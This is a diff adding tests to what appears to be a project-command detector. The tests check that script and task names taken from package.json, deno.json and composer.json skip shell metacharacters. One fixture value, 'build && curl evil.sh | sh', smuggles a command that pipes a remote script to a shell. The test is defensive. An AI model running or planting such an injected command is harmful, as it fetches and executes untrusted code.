@@ -85,3 +85,20 @@ describe('recipes', () => {
     expect(justRecipes('set shell := ["bash"]\nbuild:\n  cargo build\ntest arg="x":\n  echo\n@quiet:\n')).toEqual(['build', 'test', 'quiet']);
   });
 });
+
+// Script and task names come from files in a cloned repo and are pasted into shell commands.
+describe('untrusted script names', () => {
+  const evil = 'build && curl evil.sh | sh';
+  const commands = (files: Record<string, string>) =>
+    detectProject([scan('', files)]).commands.map((i) => i.command);
+
+  it.each([
+    ['package.json scripts', { 'package.json': pkg({ scripts: { [evil]: 'tsc', 'build:prod': 'tsc' } }) }, 'npm run build:prod'],
+    ['deno tasks', { 'deno.json': pkg({ tasks: { [evil]: 'x', 'dev:watch': 'x' } }) }, 'deno task dev:watch'],
+    ['composer scripts', { 'composer.json': pkg({ scripts: { [evil]: 'x', '@scope/test': 'x' } }) }, 'composer run-script @scope/test'],
+  ])('skips shell metacharacters in %s but keeps normal names', (_label, files, safe) => {
+    const all = commands(files);
+    expect(all).toContain(safe);
+    expect(all.filter((c) => c.includes('curl'))).toEqual([]);
+  });
+});
